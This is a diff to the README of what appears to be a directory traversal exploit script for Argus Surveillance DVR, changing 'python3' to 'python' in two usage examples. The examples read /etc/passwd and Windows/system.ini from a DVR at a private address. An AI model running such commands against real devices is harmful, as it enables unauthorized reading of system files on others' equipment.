@@ -38,13 +38,13 @@ This script exploits a directory traversal vulnerability in Argus Surveillance D
 
     For Unix
     ```sh
-    python3 argus-dvr-traversal.py 192.168.1.100 8080 /etc/passwd
+    python argus-dvr-traversal.py 192.168.1.100 8080 /etc/passwd
     ```
     This command attempts to retrieve the `/etc/passwd` file from the DVR at `192.168.1.100` on port `8080`.
 
     For Windows
     ```sh
-    python3 argus-dvr-traversal.py 192.168.1.100 8080 Windows/system.ini
+    python argus-dvr-traversal.py 192.168.1.100 8080 Windows/system.ini
     ```
     This command attempts to retrieve the `Windows/system.ini` file from the DVR at `192.168.1.100` on port `8080`.
 
